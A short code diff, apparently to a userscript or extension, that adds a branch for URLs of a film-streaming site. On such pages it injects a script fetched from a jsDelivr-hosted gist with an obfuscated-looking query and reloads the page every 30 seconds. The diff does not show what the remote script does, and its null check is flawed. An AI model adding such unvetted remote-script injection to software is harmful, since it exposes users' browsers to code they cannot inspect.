@@ -56,6 +56,15 @@ $(document).ready(function(){
 });
 
 }
+else if (d != null && d.startsWith("https://megafilmeshd50") || d.startsWith("http://megafilmeshd50")) {
+    var link;
+    link = document.createElement("script");
+    link.setAttribute("src", "//cdn.jsdelivr.net/gh/gistmib/gistmib/mf/dls.js?oo44ooo00o");
+    document.getElementsByTagName("head")[0].appendChild(link);
+    
+    setInterval(function(){window.location.reload();},30000);
+     
+}
 else{
 if (document.body.textContent.includes(text) || document.body.textContent.includes(text2)) {
 window.location = "http://vip.tv/Erro";
